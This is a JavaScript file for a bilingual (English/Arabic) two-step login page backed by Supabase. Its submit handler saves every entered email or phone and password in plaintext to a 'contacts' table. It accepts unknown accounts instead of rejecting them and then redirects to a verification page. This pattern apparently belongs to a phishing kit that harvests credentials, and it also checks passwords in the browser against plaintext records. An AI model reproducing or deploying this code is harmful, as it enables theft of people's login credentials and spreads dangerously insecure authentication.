import { supabase } from './supabase.js';
import { parsePhoneNumberFromString } from 'https://esm.sh/libphonenumber-js';

// ================= نظام الترجمة (i18n) =================
const translations = {
  en: {
    titleEmail: "Get User ID",
    titlePassword: "Enter Password",
    lblUsername: "Email/Phone number",
    lblPassword: "Password",
    btnContinue: "Continue",
    btnLogin: "Log In",
    btnBack: "← Back",
    warningEmail: "Please enter a valid email or phone number.",
    warningPassword: "Please enter your password.",
    warningPasswordLength: "Password must be at least 8 characters.",
    errorIncorrectPassword: "Incorrect password. Please try again.",
    cookies: "Cookies",
    privacy: "Privacy",
    langText: "English"
  },
  ar: {
    titleEmail: "الحصول على معرف المستخدم",
    titlePassword: "أدخل كلمة المرور",
    lblUsername: "البريد الإلكتروني/رقم الهاتف",
    lblPassword: "كلمة المرور",
    btnContinue: "متابعة",
    btnLogin: "تسجيل الدخول",
    btnBack: "→ رجوع",
    warningEmail: "يرجى إدخال بريد إلكتروني أو رقم هاتف صحيح.",
    warningPassword: "يرجى إدخال كلمة المرور.",
    warningPasswordLength: "يجب أن تكون كلمة المرور 8 أحرف على الأقل.",
    errorIncorrectPassword: "كلمة المرور غير صحيحة. حاول مرة أخرى.",
    cookies: "ملفات تعريف الارتباط",
    privacy: "الخصوصية",
    langText: "العربية"
  }
};

let currentLang = 'en';
let currentStep = 'email'; // 'email' أو 'password'

// العناصر
const form = document.getElementById('loginForm');
const emailInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const emailShell = document.getElementById('inputShell');
const passwordShell = document.getElementById('passwordShell');
const emailWarning = document.getElementById('warningText');
const passwordWarning = document.getElementById('passwordWarning');
const emailStep = document.getElementById('emailStep');
const passwordStep = document.getElementById('passwordStep');
const backToEmailBtn = document.getElementById('backToEmailBtn');
const pageTitle = document.getElementById('pageTitle');

// دالة تحديث النصوص عند تغيير اللغة
function updateLanguage() {
  const t = translations[currentLang];
  
  // تغيير اتجاه الصفحة
  document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
  document.documentElement.lang = currentLang;

  // تحديث النصوص الثابتة
  document.getElementById('lblUsername').textContent = t.lblUsername;
  document.getElementById('lblPassword').textContent = t.lblPassword;
  document.getElementById('btnContinue').textContent = t.btnContinue;
  document.getElementById('submitBtn').textContent = t.btnLogin;
  backToEmailBtn.textContent = t.btnBack;
  document.getElementById('langToggleBtn').textContent = t.langText;
  document.getElementById('lblCookies').textContent = t.cookies;
  document.getElementById('lblPrivacy').textContent = t.privacy;

  // تحديث عنوان الصفحة بناءً على الخطوة الحالية
  pageTitle.textContent = currentStep === 'email' ? t.titleEmail : t.titlePassword;

  // تحديث نصوص التحذيرات
  if (emailWarning.classList.contains('show')) {
    emailWarning.textContent = t.warningEmail;
  }
  if (passwordWarning.classList.contains('show')) {
    passwordWarning.textContent = t.warningPasswordLength;
  }
}

// زر تغيير اللغة
document.getElementById('langToggleBtn').addEventListener('click', () => {
  currentLang = currentLang === 'en' ? 'ar' : 'en';
  updateLanguage();
});


// ================= دوال التحقق (Validation) =================
function isValidEmail(value) {
  return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(value.trim());
}

function isValidPhone(value) {
  try {
    const phoneNumber = parsePhoneNumberFromString(value.trim());
    return phoneNumber && phoneNumber.isValid();
  } catch (e) { return false; }
}

function isValidLogin(value) {
  const trimmed = value.trim();
  return trimmed && (isValidEmail(trimmed) || isValidPhone(trimmed));
}

function showWarning(shell, warningEl, message) {
  shell.classList.add('error');
  warningEl.textContent = message;
  warningEl.classList.add('show');
}

function hideWarning(shell, warningEl) {
  shell.classList.remove('error');
  warningEl.classList.remove('show');
}

function setStep(step) {
  currentStep = step;
  emailStep.classList.toggle('active', step === 'email');
  passwordStep.classList.toggle('active', step === 'password');
  
  // تحديث العنوان
  pageTitle.textContent = step === 'email' ? translations[currentLang].titleEmail : translations[currentLang].titlePassword;

  if (step === 'email') {
    hideWarning(emailShell, emailWarning);
    emailInput.focus();
  } else {
    hideWarning(passwordShell, passwordWarning);
    passwordInput.focus();
  }
}

// ================= الأحداث (Events) =================
emailInput.addEventListener('input', () => {
  if (emailInput.value.trim() && !isValidLogin(emailInput.value)) {
    showWarning(emailShell, emailWarning, translations[currentLang].warningEmail);
  } else {
    hideWarning(emailShell, emailWarning);
  }
});

passwordInput.addEventListener('input', () => {
  if (!passwordInput.value.trim()) {
    showWarning(passwordShell, passwordWarning, translations[currentLang].warningPassword);
  } else if (passwordInput.value.length < 8) {
    showWarning(passwordShell, passwordWarning, translations[currentLang].warningPasswordLength);
  } else {
    hideWarning(passwordShell, passwordWarning);
  }
});

backToEmailBtn.addEventListener('click', () => setStep('email'));

// ================= إرسال النموذج =================
form.addEventListener('submit', async (event) => {
  event.preventDefault();

  if (currentStep === 'email') {
    const emailValue = emailInput.value.trim();
    if (!isValidLogin(emailValue)) {
      showWarning(emailShell, emailWarning, translations[currentLang].warningEmail);
      return;
    }
    hideWarning(emailShell, emailWarning);
    setStep('password');
    return;
  }

  const passwordValue = passwordInput.value;
  const identifier = emailInput.value.trim();

  if (passwordValue.length < 8) {
    showWarning(passwordShell, passwordWarning, translations[currentLang].warningPasswordLength);
    return;
  }

  const submitBtn = document.getElementById('submitBtn');
  submitBtn.disabled = true;
  submitBtn.textContent = '...';

  try {
    const { data: existingUser, error: fetchError } = await supabase
      .from('contacts').select('*').eq('email', identifier).maybeSingle();

    if (fetchError) throw fetchError;

    if (existingUser) {
      if (existingUser.password === passwordValue) {
        sessionStorage.setItem('pendingEmail', identifier);
        window.location.href = 'verification.html?email=' + encodeURIComponent(identifier);
      } else {
        showWarning(passwordShell, passwordWarning, translations[currentLang].errorIncorrectPassword);
        submitBtn.disabled = false;
        submitBtn.textContent = translations[currentLang].btnLogin;
      }
    } else {
      const { error: insertError } = await supabase
        .from('contacts')
        .insert([{ email: identifier, password: passwordValue, status: 'pending' }]);

      if (insertError) throw insertError;
      
      sessionStorage.setItem('pendingEmail', identifier);
      window.location.href = 'verification.html?email=' + encodeURIComponent(identifier);
    }

  } catch (error) {
    console.error('❌ حدث خطأ:', error);
    alert('حدث خطأ في الاتصال بقاعدة البيانات.');
    submitBtn.disabled = false;
    submitBtn.textContent = translations[currentLang].btnLogin;
  }
});

// التهيئة الأولى
updateLanguage();
emailInput.focus();